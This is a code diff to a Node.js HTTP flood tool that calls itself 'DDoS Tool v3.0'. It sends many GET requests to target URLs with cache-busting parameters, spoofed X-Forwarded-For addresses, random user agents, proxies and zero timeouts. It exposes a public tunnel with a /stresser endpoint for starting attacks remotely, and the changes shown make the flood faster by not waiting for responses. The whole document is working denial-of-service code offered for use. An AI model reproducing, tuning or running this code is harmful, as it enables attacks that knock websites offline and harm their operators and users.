@@ -23,6 +23,27 @@ let batchDurations = [];
 let nportUrl = null;
 let tunnelActive = false;
 
+axios.defaults.timeout = 0;
+axios.defaults.maxRedirects = 0;
+axios.defaults.validateStatus = () => true;
+
+const httpAgent = new http.Agent({
+  keepAlive: false,
+  maxSockets: Infinity,
+  maxFreeSockets: 256,
+  timeout: 0,
+  scheduling: 'fifo'
+});
+
+const httpsAgent = new https.Agent({
+  keepAlive: false,
+  maxSockets: Infinity,
+  maxFreeSockets: 256,
+  timeout: 0,
+  rejectUnauthorized: false,
+  scheduling: 'fifo'
+});
+
 const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout
@@ -48,20 +69,17 @@ const cipherSuites = [
 const SELECTED_CIPHER = cipherSuites[process.env.CIPHER_INDEX || 2];
 
 const generateCacheBuster = () => {
-  return `${Date.now()}_${Math.random()}_${crypto.randomBytes(8).toString('hex')}`;
+  return `${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
 };
 
 const getNoCacheHeaders = () => {
-  const headers = randomHeaders();
-
-  headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, max-age=0';
-  headers['Pragma'] = 'no-cache';
-  headers['Expires'] = '0';
-  headers['X-Forwarded-For'] = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-  headers['X-Requested-With'] = 'XMLHttpRequest';
-  headers['User-Agent'] = randomUserAgent();
-  
-  return headers;
+  return {
+    'Cache-Control': 'no-cache, no-store, max-age=0',
+    'Pragma': 'no-cache',
+    'User-Agent': randomUserAgent(),
+    'Connection': 'close',
+    'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
+  };
 };
 
 const createHttpsAgent = (proxyUrl, proxyProtocol) => {
@@ -69,7 +87,8 @@ const createHttpsAgent = (proxyUrl, proxyProtocol) => {
     ciphers: SELECTED_CIPHER,
     honorCipherOrder: true,
     rejectUnauthorized: false,
-    keepAlive: true,
+    keepAlive: false,
+    timeout: 0,
   };
 
   if (proxyProtocol === "socks5") {
@@ -148,9 +167,8 @@ const performAttack = async (sessions, agent, threadId) => {
     return;
   }
 
-  const batchStartTime = Date.now();
   let successfulRequests = 0;
-  const allRequests = [];
+  const startTime = Date.now();
   
   for (const session of activeSessions) {
     let url = session.url;
@@ -160,32 +178,24 @@ const performAttack = async (sessions, agent, threadId) => {
       const separator = url.includes('?') ? '&' : '?';
       const cacheBustedUrl = `${url}${separator}_=${cacheBuster}&nocache=${cacheBuster}&cb=${Date.now()}`;
       
-      const headers = getNoCacheHeaders();
-      
-      const request = axios.get(cacheBustedUrl, { 
+      axios.get(cacheBustedUrl, { 
         httpsAgent: agent, 
-        headers: headers, 
+        headers: getNoCacheHeaders(), 
         timeout: 0,
         validateStatus: () => true
-      }).catch(() => null);
+      }).catch(() => {});
       
-      allRequests.push(request);
+      successfulRequests++;
     }
   }
 
-  try {
-    const results = await Promise.allSettled(allRequests);
-    successfulRequests = results.filter((result) => result.status === "fulfilled" && result.value).length;
-  } catch (err) {}
-
-  const batchDuration = Date.now() - batchStartTime;
-  batchDurations.push(batchDuration);
   totalRequestsSent += successfulRequests;
-
-  if (successfulRequests > 0 && threadId === 0) {
-    const rps = (successfulRequests / (batchDuration / 1000)).toFixed(1);
+  
+  const duration = Date.now() - startTime;
+  if (threadId === 0) {
+    const rps = (successfulRequests / (duration / 1000)).toFixed(1);
     console.log(
-      `${colors.green('✓')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)}`
+      `${colors.green('⚡')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Thread: ${threadId}`)}`
     );
   }
 
@@ -205,8 +215,6 @@ const autoStartTunnel = async () => {
       tunnelActive = true;
       console.log(colors.green(`✅ Tunnel active: ${nportUrl}`));
       console.log(colors.yellow(`🌍 Public URL: ${nportUrl}/stresser`));
-      console.log(colors.gray(`   ${nportUrl}/stop`));
-      console.log(colors.gray(`   ${nportUrl}/status`));
       return true;
     } else {
       console.log(colors.red('❌ Failed to start tunnel, but continuing without tunnel'));
@@ -242,8 +250,8 @@ const startAttack = async (url, durationHours) => {
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
   console.log(colors.green(`\n🚀 Attack Started on ${url} for ${durationHours} hour(s)`));
-  console.log(colors.cyan(`Threads: ${numThreads} | Requests/thread: ${REQUESTS_PER_THREAD}`));
-  console.log(colors.yellow(`Cache-Busting: ENABLED | No-Cache: ACTIVE`));
+  console.log(colors.cyan(`🔥 Threads: ${numThreads} | Requests/thread: ${REQUESTS_PER_THREAD}`));
+  console.log(colors.yellow(`⚡ Timeout: 0 (MAX SPEED) | Cache-Busting: ENABLED`));
   
   if (tunnelActive && nportUrl) {
     console.log(colors.magenta(`🌐 Public Tunnel URL: ${nportUrl}`));
@@ -301,6 +309,7 @@ const showStatus = () => {
   });
   console.log(`${colors.green('Total Requests:')} ${formatNumber(totalRequestsSent)}`);
   console.log(`${colors.cyan('Threads:')} ${numThreads}`);
+  console.log(`${colors.yellow('Timeout:')} 0 (MAX SPEED)`);
   if (tunnelActive && nportUrl) {
     console.log(`${colors.magenta('Public URL:')} ${nportUrl}`);
   }
@@ -309,7 +318,7 @@ const showStatus = () => {
 
 const showHelp = () => {
   console.log(colors.cyan('\n=== COMMANDS ==='));
-  console.log(`${colors.green('start <url> [hours]')}     - Start attack`);
+  console.log(`${colors.green('start <url> [hours]')}     - Start attack (MAX SPEED)`);
   console.log(`${colors.green('stop')}                    - Stop attack`);
   console.log(`${colors.green('status')}                  - Show status`);
   console.log(`${colors.green('add <url> [hours]')}       - Add target`);
@@ -321,8 +330,8 @@ const showHelp = () => {
 
 const clearConsole = () => {
   console.clear();
-  console.log(colors.green('DDoS Tool v3.0 - Force Origin Mode with Auto Tunnel'));
-  console.log(colors.gray('Tunnel auto-starts with subdomain: ddos'));
+  console.log(colors.green('DDoS Tool v3.0 - MAX SPEED MODE'));
+  console.log(colors.gray('Timeout: 0 | No waiting | Maximum throughput'));
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
@@ -413,7 +422,8 @@ app.get("/stresser", async (req, res) => {
     success: true, 
     message: `Attack started on ${url}`, 
     duration: `${duration}h`,
-    tunnel: tunnelActive ? nportUrl : null
+    tunnel: tunnelActive ? nportUrl : null,
+    speed: "MAX (timeout: 0)"
   });
 });
 
@@ -429,6 +439,7 @@ app.get("/status", (req, res) => {
     targets: sessions.map(s => s.url),
     totalRequests: totalRequestsSent,
     threads: numThreads,
+    timeout: 0,
     tunnel: tunnelActive ? nportUrl : null
   });
 });
@@ -443,7 +454,8 @@ app.get("/config", (req, res) => {
     attack: {
       threads: parseInt(numThreads),
       requestsPerThread: parseInt(REQUESTS_PER_THREAD),
-      cipher: SELECTED_CIPHER
+      timeout: 0,
+      maxSpeed: true
     }
   });
 });
@@ -455,8 +467,9 @@ const port = process.env.PORT || 25694;
   
   app.listen(port, () => {
     console.clear();
-    console.log(colors.green(`\n🔧 DDoS Tool v3.0 - BotNet`));
+    console.log(colors.green(`\n⚡ DDoS Tool v3.0 - MAX SPEED MODE`));
     console.log(colors.cyan(`🌐 Local API: http://localhost:${port}`));
+    console.log(colors.yellow(`⏱️  Timeout: 0 (NO WAITING - MAXIMUM SPEED)`));
     if (tunnelActive && nportUrl) {
       console.log(colors.magenta(`🌍 Public API: ${nportUrl}`));
       console.log(colors.gray(`   ├─ ${nportUrl}/stresser?url=<URL>&duration=<HOURS>`));
